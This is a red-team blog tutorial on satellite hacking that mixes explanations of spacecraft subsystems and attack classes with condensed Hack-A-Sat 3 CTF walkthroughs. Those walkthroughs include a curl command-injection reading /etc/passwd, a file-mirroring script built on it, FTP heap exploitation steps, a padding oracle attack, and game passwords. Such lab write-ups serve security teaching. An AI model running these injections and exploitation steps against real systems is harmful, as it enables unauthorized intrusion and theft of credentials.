---
layout: post
title:  "Satellite Hacking Demystified(RTC0007)"
author: redteamrecipe
categories: [ tutorial ]
tags: [red, blue]
image: assets/images/15.jpg
description: "Satellite Hacking Demystified"
featured: true
hidden: true
rating: 4.5
---



### ADCS (Attitude Determination and Control System)


ADCS stands for Attitude Determination and Control System. It is a crucial component of satellites, spacecraft, and other vehicles operating in space. The primary function of an ADCS is to determine and control the orientation, or attitude, of the vehicle in space.

Attitude Determination involves determining the vehicle's current attitude, which includes its orientation, angular velocity, and angular acceleration. This information is obtained through sensors such as gyroscopes, sun sensors, star trackers, magnetometers, and horizon sensors. These sensors measure various physical quantities to calculate the vehicle's attitude.

Attitude Control, on the other hand, involves adjusting the vehicle's orientation to maintain a desired attitude or to execute specific maneuvers. This is achieved by using actuators such as reaction wheels, thrusters, magnetic torquers, and control moment gyroscopes. These actuators apply torque or force to change the vehicle's attitude.

As for attacks on the ADCS, there are various potential threats that can disrupt or compromise the system. Here are a few examples:

1. Sensor Attacks: Attackers may attempt to manipulate or deceive the sensors used for attitude determination. For instance, they could shine bright lights or lasers at the sensors to cause erroneous readings, or they could use electromagnetic radiation to interfere with the sensor signals.
    
2. Actuator Attacks: Adversaries may target the actuators responsible for attitude control. They might try to disable or tamper with the actuators, preventing the vehicle from adjusting its attitude correctly or causing it to drift off its intended course.
    
3. Communication Attacks: If the ADCS relies on external commands or data from ground control or other sources, attackers could intercept or manipulate the communication channels. They could inject false commands or alter the data sent to the ADCS, leading to incorrect attitude determination or control.
    
4. Software Attacks: ADCS systems often utilize software for processing sensor data, implementing control algorithms, and managing operations. Malicious actors could exploit software vulnerabilities or inject malicious code to compromise the integrity and functionality of the ADCS.


### C&DH (Command and Data Handling System)


C&DH stands for Command and Data Handling System. It is an essential subsystem found in satellites, spacecraft, and other vehicles operating in space. The primary function of the C&DH system is to handle the onboard commands and manage the flow of data within the vehicle.

The Command and Data Handling System typically consists of several components:

1. Command System: This component receives commands from ground control or other sources and distributes them to the appropriate subsystems within the vehicle. It decodes the commands and ensures they are executed correctly.
    
2. Data System: The data system manages the storage, processing, and transmission of data onboard the vehicle. It collects data from various sensors and subsystems, processes it if necessary, and stores or transmits it as required. This component is also responsible for managing telemetry data, which is data transmitted from the vehicle to the ground for monitoring and analysis.
    
3. Central Processing Unit (CPU): The CPU serves as the brain of the C&DH system, executing software instructions and coordinating the operation of the various subsystems. It handles the computational tasks required for command processing, data management, and system control.
    
4. Memory: The C&DH system includes both volatile and non-volatile memory to store commands, data, and software programs. Volatile memory (such as RAM) is used for temporary storage during operation, while non-volatile memory (such as EEPROM or flash memory) retains data even when power is removed.
    

Now, regarding attacks on the C&DH system, here are a few examples:

1. Command Injection: Attackers may attempt to inject unauthorized commands into the system. If they can gain access to the communication channel or exploit vulnerabilities in the command reception process, they may send malicious or unauthorized commands that could disrupt or compromise the vehicle's operation.
    
2. Data Manipulation: Adversaries could target the data system and attempt to manipulate or corrupt the data being collected, processed, or transmitted. This could lead to erroneous decision-making, incorrect analysis, or compromised mission objectives.
    
3. Software Exploitation: If there are software vulnerabilities present in the C&DH system, attackers could exploit them to gain unauthorized access, execute arbitrary code, or disrupt the normal operation of the system. This could include buffer overflow attacks, code injection, or privilege escalation.
    
4. Physical Attacks: In some cases, attackers might physically tamper with the C&DH hardware or infrastructure. This could involve replacing components, modifying circuitry, or introducing malicious devices that intercept or manipulate the flow of commands and data.



### MQTT 


MQTT (Message Queuing Telemetry Transport) is a lightweight messaging protocol designed for efficient communication between devices in Internet of Things (IoT) and machine-to-machine (M2M) scenarios. It follows a publish-subscribe model, where devices publish messages to topics, and other devices subscribe to those topics to receive the messages.

Here are some key features of MQTT:

1. Lightweight: MQTT is designed to be lightweight and efficient, making it suitable for resource-constrained devices with limited processing power and bandwidth.
    
2. Publish-Subscribe Model: Devices can publish messages to specific topics, and other devices interested in those topics can subscribe to receive those messages.
    
3. Quality of Service (QoS): MQTT supports different levels of QoS to ensure reliable message delivery. QoS levels range from QoS 0 (at most once) to QoS 2 (exactly once), allowing trade-offs between message delivery guarantees and network overhead.
    
4. Asynchronous Communication: MQTT enables asynchronous communication, allowing devices to send and receive messages without establishing and maintaining persistent connections.
    

Now, regarding attacks on MQTT, here are a few examples:

1. Unauthorized Access: Attackers may attempt to gain unauthorized access to MQTT brokers or devices using weak or default credentials. Once inside, they could eavesdrop on messages, inject malicious messages, or perform further attacks on the network.
    
2. Message Tampering: If an attacker gains access to the MQTT network, they could intercept and tamper with messages being published or subscribed to. They may modify message contents, inject malicious payloads, or spoof the source of messages.
    
3. Denial of Service (DoS): Attackers could overload the MQTT infrastructure or devices with a flood of messages, causing a denial of service. This could disrupt communication, degrade system performance, or exhaust device resources.
    
4. Man-in-the-Middle (MitM): By intercepting MQTT communications, attackers can position themselves as intermediaries between devices and brokers, enabling them to intercept, modify, or block messages. This allows them to gain unauthorized access or manipulate the communication flow.
    
5. MQTT Broker Vulnerabilities: MQTT brokers, the central components that handle message routing, can have vulnerabilities that attackers may exploit. These vulnerabilities could include buffer overflows, code injection, or other software vulnerabilities that allow unauthorized access or compromise the integrity of the MQTT system.




### 403 Forbidden

1. Enumeration with Gobuster:
    

    
    `gobuster dir -u http://10.23.223.25 -w wordlist.txt`
    
    This command uses Gobuster to enumerate the webserver and search for hidden directories or files. In this case, no significant findings were reported.
    
2. Path Traversal with Curl:
    

    
    `curl -v --path-as-is http://10.23.223.25/assets/../../../`
    
    This command performs a path traversal by accessing the server using Curl and manipulating the path to go back multiple directories (`../../../`) to reach a forbidden directory. It reveals the directory listing.
    
3. Command Injection with Curl:
    

    
    `curl -v --path-as-is http://10.23.223.25/assets%20|cat%20/etc/passwd/`
    
    This command exploits a command injection vulnerability by appending a shell command (`cat /etc/passwd`) to the path of the webserver. It uses the `|` character and URL encoding (`%20`) to execute the command within the HTTP request. It retrieves the contents of the `/etc/passwd` file.
    
4. Directory Listing with Curl:
    

    
    `curl -v --path-as-is http://10.23.223.25/server/www/html/groundstations/`
    
    This command uses Curl to access a specific directory (`/server/www/html/groundstations/`) on the server and retrieves the directory listing, showing the files and folders within it.
    
5. Retrieving Flag:
    
    
    `curl -v --path-as-is http://10.23.223.25/server/www/html/flag/flag.txt`
    
    This command uses Curl to access a specific file (`/server/www/html/flag/flag.txt`) and retrieves its content, which happens to be the flag for the challenge.


### 150 File Status

1. Connecting to the FTP server:
    
    
    `$ ftp 10.23.223.25:21`
    
    This command initiates a connection to the FTP server running on the provided IP address (`10.23.223.25`) and port (`21`).
    
2. Authenticating with the FTP server:
    
    
    `User: hasftpd Password: L@bm0nkey2delta`
    
    These commands authenticate with the FTP server using the provided username (`hasftpd`) and password (`L@bm0nkey2delta`).
    
3. Enabling passive mode:
    
    
    `ftp> passive`
    
    This command enables passive mode for the FTP connection. Passive mode is typically used when the client is behind a firewall and needs to establish data connections with the server.
    
4. Retrieving the FTP server binary:
    
    
    `ftp> get hasftpd`
    
    This command retrieves the `hasftpd` binary file from the FTP server and downloads it to the local machine.
    
5. Exploiting directory listing vulnerability:
    
    
    `ftp> LIST /path/to/directory`
    
    This command lists the files in the specified directory (`/path/to/directory`) on the FTP server. The vulnerability allows listing files from any folder in the filesystem, not just the restricted ones.
    
6. Exploiting info leak vulnerability:
    
    
    `ftp> TYPE %x%x`
    
    This command exploits an info leak vulnerability by setting the `TYPE` of the FTP connection to `%x%x`, which allows leaking the value of the `homedir` string address.
    
7. Exploiting use-after-free and double free vulnerabilities:
    
    
    `ftp> QUEU <command> ftp> EXEC ftp> FREE <id>`
    
    These commands exploit the use-after-free and double free vulnerabilities in the custom FTP commands. The `QUEU` command allows embedding commands in the queue, `EXEC` runs the queued commands, and `FREE` frees a specific command by its ID.
    
8. Exploiting the `house_of_botcake` technique: The `house_of_botcake` technique is used to coalesce small bins chunks into a larger one, allowing control over the linked list's `next` pointer. By manipulating the `next` pointer, the address of the `homedir` string can be set, allowing further exploitation.
    
9. Manipulating `homedir` and retrieving files:
    
    
    `ftp> RETR /path/to/file`
    
    With the ability to manipulate the `homedir` string, the `RETR` command can be used to download files from the FTP server. Replace `/path/to/file` with the actual path of the desired file.


### Antenna Pointing

GMAT (General Mission Analysis Tool), a software developed by NASA, as an alternate orbit calculation method to verify the results obtained with the SGP4 (Simplified General Perturbations) model.

1. GMAT GUI and Satellite Orbit:
    
    - Create a new spacecraft in GMAT using the provided Keplerian elements (Semi-Major Axis, Eccentricity, Inclination, Right Ascension of Ascending Node, Argument of Perigee, and True Anomaly).
    - Set the epoch (start time) of the orbit.
    - Configure the coordinate system and state type for the spacecraft.
2. Propagator:
    
    - Modify the default propagator in GMAT to simulate the satellite's orbit.
    - Configure the gravity model, atmosphere model, and point masses (such as Earth, Moon, and Sun) for accurate calculations.
    - Set the step size for propagating the satellite's position.
3. Ground Stations:
    
    - Create ground stations in GMAT using the provided parameters, including minimum elevation, central body (Earth), state type, and location coordinates (latitude, longitude, and altitude).
    - Define coordinate systems for each ground station to generate satellite positions relative to them.


### Coffee Ground


1. File Content:
    
    - coffee.java: ELF x86-64 binary file
    - coffee.png: 1024x682 JPEG image file
    - serv: ELF x86-64 binary file
2. Suspected Vulnerability:
    
    - The key variable is on the stack at offset RBP + -0xb8 (0xffffff48).
    - The server writes back using a variable on the stack at offset RBP + -0xa8.
    - To obtain the flag, modify the instruction at 0x0010200d: replace 58 ff ff ff with 48 ff ff ff.
3. Obtaining the Password:
    
    - The offset in the file is 0x2010.
    - Send the following payload: `b'8208\nH8\nhello! '` to output the password.
4. Rolling Passwords for Ground Stations:
    
    - Port 13000, Guam: Password - YJsiWoh9
    - Port 13001, Mauritius: Password - JF-CM03E
    - Port 13002, Mingenew: Password - qL_MPv3_
    - Port 13003, Los Angeles: Password - jMOLbpmi
    - Port 13004, Cordoba: Password - kCt9XFgr



### Digital Twin


HACK-A-SAT 3: Digital Twin exploration and tooling

Networking exploration
- `getent hosts <hostname>`: Retrieve the IP address associated with a hostname.

Digital Twin setup
- `GS > procedures > gs_script.rb`: Run the `gs_script.rb` procedure in COSMOS to configure the ground station, radio, antenna, and send commands to enable telemetry.

Leaking COSMOS custom RubyGems
- Retrieve Gem files:
  - `curl -H 'Authorization: REDACTED' 'https://cosmos.solarwine-digitaltwin.satellitesabove.me/cosmos-api/storage/download/cosmos-has3-gnd-1.0.0.gem?scope=DEFAULT&bucket=gems' | jq`
- Dump files using the COSMOS password:
  - `curl -H 'Authorization: REDACTED' 'https://cosmos.solarwine-digitaltwin.satellitesabove.me/cosmos-api/storage/download/<file-name>'`

Telemetry monitoring
- Create a Prometheus exporter to collect telemetry: Use the WebSocket endpoint `/cosmos-api/cable` to subscribe to telemetry events and store them in a timeseries database.

Logging cFE and Ground Station events
- Subscribe to telemetry packets:
  - `CFE_EVS EVENT_MSG_PKT`: Subscribe to cFE event messages.
  - `GS ACCESS_STATUS`: Subscribe to Ground Station access status.
- Forward telemetry to a Discord channel.

Satellite emulation
- Emulate the satellite using QEMU:
  - Install QEMU: `git clone https://gitlab.com/qemu/qemu.git && git -C qemu checkout 214a8da23651f2472b296b3293e619fd58d9e212 && (cd qemu && ./configure --target-list=riscv32-linux-user && make -j4)`
  - Run core-cpu1: `LIB_DIR="<path/to/remote_sat/lib>" qemu/build/qemu-riscv32 -L "$LIB_DIR" -E "LD_LIBRARY_PATH=$LIB_DIR" "$LIB_DIR/ld-linux-riscv32-ilp32d.so.1" ./core-cpu1`

Sending Commands
- Enable telemetry:
  - `codec.high_push(CCSDSPacket() / KIT_TO_ENABLE_TELEMETRY_CmdPkt(IP_ADDR='127.0.0.1'))`
- List applications:
  - `codec.high_push(CCSDSPacket() / CFE_ES_SHELL_CmdPkt(CMD_STRING="ES_ListApps", OUTPUT_FILENAME="/cf/cmd"))`
- Run a shell command:
  - `codec.high_push(CCSDSPacket() / CFE_ES_SHELL_CmdPkt(CMD_STRING="uname -a", OUTPUT_FILENAME="/cf/cmd"))`
- Start MM application:
  - `codec.high_push(CCSDSPacket() / CFE_ES_START_APP_CmdPkt(APP_NAME="MM", APP_ENTRY_POINT="MM_AppMain", APP_FILENAME="/cf/mm.so", STACK_SIZE=16384, PRIORITY=90))`



### Puzzle Box

1. Enable telemetry: `KIT_TO ENABLE_TELEMETRY` - Enables telemetry.
2. Setup PuzzleBox: `PUZZLEBOX STAGE_1 <payload>` - Sets up the PuzzleBox for further stages. Replace `<payload>` with a 16-byte payload.
3. Solve PuzzleBox stage 1: `PUZZLEBOX STAGE_1 This_1snt_the_aN` - Attempts to solve the first stage of the PuzzleBox.
4. Solve PuzzleBox stage 2: `PUZZLEBOX STAGE_2 sWeR_cH3cK_7hE_t` - Attempts to solve the second stage of the PuzzleBox.
5. Solve PuzzleBox stage 3: `PUZZLEBOX STAGE_3 0k3n_p@9e_pRoLly <algorithm_selection>` - Attempts to solve the third stage of the PuzzleBox. Replace `<algorithm_selection>` with a sequence of four encoding algorithm numbers (1, 2, or 3).
6. Solve PuzzleBox stage 4: `PUZZLEBOX STAGE_4 _s0meth!n_tH3re.` - Attempts to solve the fourth stage of the PuzzleBox.
7. Reset PuzzleBox: `RESET_CTRS` - Resets the PuzzleBox.
8. Wait for flag: Monitor the telemetry for the flag to appear in the `TOKEN` field.



### Radio Settings

Each team has radio access codes and specific settings. As part of the attack-defense game, we had to explore how to connect to other teams' satellites. This guide provides instructions on how to log Ground Stations settings and use them to connect to other teams' satellites.

Logging Ground Stations settings evolution:

1. Establish an SSH connection to the Solar Wine game server: `ssh -L 8088:10.23.223.25:80 solarwine-game`.
2. Run the following Bash script to mirror the Ground Stations files locally:

```
#!/usr/bin/env bash
URL="http://localhost:8088/assets%20|cat%20/server/www/html/groundstations/"
curl -s --path-as-is "${URL}index.html/"> index.html &\
curl -s --path-as-is "${URL}index_Cordoba.html/"> index_Cordoba.html &\
# [...]
curl -s --path-as-is "${URL}rx_settings_Cordoba.json/"> rx_settings_Cordoba.json &\
# [...]

```

3. The script retrieves HTML and JSON files for each Ground Station, containing the necessary data.

Mapping channels identifier to each team:

1: SpaceBitsRUs, 
2: organizers, 
3: perfect blue, 
4: Samurai, 
5: Poland Can Into Space, 
6: SingleEventUpset, 
7: Solar Wine, 
9: WeltALLES! (also sometimes 19).

Connecting to other teams' satellites:

1. Analyze the connections patterns and identify the Ground Station associated with the target team.
2. Obtain the radio access codes and specific settings for the target team's Ground Station from the logged data.
3. Configure your own Ground Station to match the target team's settings.
4. Establish a connection to the target team's satellite using their radio access codes and the configured settings.
5. Monitor the connection for telemetry data or other relevant information.

https://virgo.readthedocs.io/en/latest/
https://www.g0kla.com/foxtelem/


### RISC V Business

1-BULK_MISSIONS (function code 105):
    
    - Send a bulk missions request.
    - Syntax: BULK_MISSIONS <count> <mission_ids>
    - Example: BULK_MISSIONS 26 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26
    
2-STORE_MISSION_DATA (function code 4):
    
    - Store mission data.
    - Syntax: STORE_MISSION_DATA <mission_data>
    - Example: STORE_MISSION_DATA 6545
    
3-CFE_ES SEND_APP_INFO:
    
    - Send an application information request to CFE_ES.
    - Syntax: CFE_ES SEND_APP_INFO <APP_NAME>
    - Example: CFE_ES SEND_APP_INFO TELESCOPE
    
4-TELESCOPE BULK_MISSIONS command:
    
    - Send a bulk missions command to the telescope.
    - Syntax: TELESCOPE BULK_MISSIONS <COUNT> <MISSION_IDS>
    - Example: TELESCOPE BULK_MISSIONS 26 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26
    
5-GDB commands (to be used in the GDB setup):
    
    - set breakpoint <address>: Set a breakpoint at the specified address.
    - run: Start execution of the program.
    - continue: Continue program execution after hitting a breakpoint.
    - info register: Display the current register values.
    - bt: Display the backtrace.
    - x/<n>x <address>: Examine the memory at the specified address in hex format.



### Sacred Ground

1. Connect to the service:
    
    `nc <IP> 13100`
    
    
2. Retrieve encrypted keys for Ground Stations:
    
    `get_key Melbourne get_key Maspalomas get_key Tokyo get_key Kathmandu get_key Hawaii`
    
3. Perform a padding oracle attack to decrypt the keys:
    
    - Use a script or tool to automate the attack, such as Python with the `pycryptodome` library.
    - Implement the PKCS7 padding scheme and CBC mode of operation.
    - Retrieve the cleartext content one byte at a time by manipulating the encrypted key and observing the padding error responses.
    
4. Use the decrypted keys to connect to the Ground Stations:
    
    `connect Melbourne whackyauctionclumsyeditorvividly connect Maspalomas oxygenlettucereprintmatchbookbroiler connect Tokyo comradeshindigscratchfreeloadtributary connect Kathmandu slicereveryonecrewmateantidotebannister connect Hawaii awokefacialheadlocklandedexpectant`
    
5. Repeat the process to retrieve current passwords if they change over time.



### Three App Monte

1. Send CFE_ES SEND_APP_INFO command to retrieve the address of SPACEFLAG_Send_Token:
    
    `CFE_ES SEND_APP_INFO APP_NAME=SPACEFLAG`
    
2. Receive the CFE_ES APP_INFO_TLM_PKT packet and note the START_ADDR property.
    
3. Compute the address of SPACEFLAG_Send_Token:
    
    `SPACEFLAG_Send_Token_Address = START_ADDR - 0x00010de8 + 0x00011376`
    
4. Craft an extended SMS command to set SMS_CMD_MID to 0x1f80:
    
    `SMS NORMAL_MSG INTERNAL_USE=1722 MESSAGE=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
    
5. (Optional) Send a NoOp command to mon.so using MsgId = 0x1f80 to ensure communication with mon.so:
    
    `MON NOOP MSG_ID=0x1f80`
    
6. Send the Debug command to mon.so with the valid SPACEFLAG_Send_Token address as an argument:
    
    `MON DEBUG ADDRESS=<SPACEFLAG_Send_Token_Address>`
    
7. Receive the SPACEFLAG TOKEN_TLM_PKT packet and read the flag from it.


### Satellite availability challenge


1-Monitor EPS telemetry to calculate power usage:
    
    - Use EPS telemetry data to track current and voltage values.
    - Calculate power consumption for each component using the formula: Power = Current * Voltage.
    
2-Identify power-hungry components:
    
    - Analyze the power consumption data to determine the components that consume the most power.
    - Based on the provided information, the power-hungry components are:
        - COMM Payload: 7.6 W
        - TT&C COMM: 5.3 W
        - Star tracker: 5.2 W
        - C&DH: 3.7 W
        - ADCS: 2.5 W
        
3-Preserve energy during the night period:
    
    - Disable unnecessary components during the night period to reduce energy consumption.
    - As disabling ADCS resulted in a decrease in points earning rate, it is not recommended to disable it.
    
4-Lower payload's battery consumption:
    
    - Explore commands or methods to communicate with the SDR payload and adjust its power settings.
    - Unfortunately, if no commands are found to control the SDR, alternative strategies may be required.


### Finding and accessing COSMOS

COSMOS enables mission operators to communicate with ground stations and the satellite, allowing them to perform various tasks such as telemetry acquisition, command execution, and system monitoring. It provides a user-friendly interface for managing spacecraft operations and simplifies the process of interacting with the satellite during a mission.

the attacker's objective was to gain access to COSMOS and exploit vulnerabilities in the system. They started by obtaining SSH keys to connect to an AWS host and then discovered the hostname for COSMOS: cosmos.poland.has3.satellitesabove.me. This allowed them to access the COSMOS interface and begin communicating with ground stations and the satellite.


### Brute force attack against TC channel or mission channel

The TC channel allows mission operators to send various commands to the spacecraft, such as controlling its subsystems, executing maneuvers, collecting data, or performing specific operations. It is crucial for spacecraft operations and enables the ground control team to interact with the spacecraft in real-time.

The mission channel, on the other hand, typically refers to a broader communication channel that encompasses the transmission of various mission-related data and information. This can include telemetry data, scientific measurements, status reports, and other mission-specific data.

Both the TC channel and mission channel play vital roles in ensuring the successful operation and communication of a spacecraft during its mission. Secure and reliable communication channels are essential to maintain the integrity and safety of space missions.

The TC channel is responsible for sending commands and instructions to a satellite, while the mission channel refers to the communication channel dedicated to transmitting mission-related data and information. By conducting a brute force attack against these channels, an attacker is trying to discover valid credentials (such as passwords or encryption keys) to gain control over the satellite's functions or access mission-sensitive data.


### Direct Attack to Space Communication Links: Exploitation of clear mode (also known as safe mode)

A "Direct Attack to Space Communication Links: Exploitation of clear mode (also known as safe mode)" refers to a type of attack where an attacker targets the space communication links and exploits the clear mode or safe mode of operation.

Clear mode or safe mode is a protective state that a satellite or spacecraft enters when it encounters an anomaly or an unexpected event. In this mode, certain functionalities may be limited or disabled to ensure the safety and integrity of the satellite.

In the context of the attack, the attacker aims to exploit vulnerabilities in the clear mode or safe mode of operation to gain unauthorized access or manipulate the space communication links. By doing so, they may attempt to disrupt or interfere with the communication between the satellite and ground stations, compromise the integrity of the transmitted data, or even take control of the satellite.

The specific techniques used to exploit the clear mode or safe mode vulnerabilities may vary depending on the security measures implemented by the satellite system. These techniques could involve leveraging known software or hardware weaknesses, unauthorized commands or instructions, or exploiting flaws in the communication protocols or encryption mechanisms.

1-Eavesdropping: Attackers intercept and capture the communication signals between the ground station and the satellite. By analyzing the intercepted data, they may gain sensitive information or insights into the communication protocols, potentially leading to further exploitation.

2-Signal Jamming: Attackers transmit high-power interference signals that disrupt or block the communication signals between the ground station and the satellite. This can result in the loss of communication or degradation of the communication link, causing disruption to the satellite's operations.

3-Injection Attacks: Attackers inject malicious commands or data into the communication stream between the ground station and the satellite. By exploiting vulnerabilities in the protocols or systems, they may manipulate or modify the transmitted commands, leading to unintended consequences or compromising the integrity of the communication.

4-Replay Attacks: Attackers capture valid commands or data transmitted between the ground station and the satellite and replay them at a later time. This can lead to the repetition of commands or unintended actions, potentially disrupting the satellite's operations or causing unauthorized actions to occur.



### Resources

- https://github.com/solar-wine/writeups
- https://hackasat.com/players-corner/
- Poland Can Into Space
- https://spaceshield.esa.int/
- https://github.com/orbitalindex/awesome-space
- https://limemicro.com/community/open-satellite-project/

















